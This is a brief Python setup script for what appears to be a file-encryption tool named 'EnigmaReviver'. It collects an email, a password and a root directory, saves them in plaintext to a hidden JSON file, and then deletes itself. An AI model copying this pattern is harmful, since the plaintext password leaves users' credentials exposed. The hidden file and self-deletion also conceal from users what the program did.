from colorama import Fore, init
from os import remove,path
from  json import dump
from win32api import   SetFileAttributes
import win32con

init(autoreset=True)
print(Fore.GREEN + "    ______      _                       ____            _")
print(Fore.GREEN + "   / ____/___  (_)___ _____ ___  ____ _/ __ \___ _   __(_)   _____  _____")
print(Fore.YELLOW + "  / __/ / __ \/ / __ `/ __ `__ \/ __ `/ /_/ / _ \ | / / / | / / _ \/ ___/")
print(Fore.BLUE + " / /___/ / / / / /_/ / / / / / / /_/ / _, _/  __/ |/ / /| |/ /  __/ /")
print(Fore.MAGENTA +"/_____/_/ /_/_/\__, /_/ /_/ /_/\__,_/_/ |_|\___/|___/_/ |___/\___/_/\n\n\n")


UserEmail = input('Please  do enter your email address   :   ')
UserPassword = input('Your password   :   ')
RootDir = input('The directory from which you wish to start data encryption :  ')


with open(path.abspath('.User__Data.json') ,'w') as UserDataFile:
    dump(
        
            {
                "email"    :UserEmail,
                "password" :UserPassword,
                "root_dir" : RootDir
            }
        
    ,UserDataFile, indent=4)


# Set the file's hidden attribute
SetFileAttributes('.User__Data.json', win32con.FILE_ATTRIBUTE_HIDDEN)    
    
# Delete the executable file
remove(path.abspath(__file__))
    
        

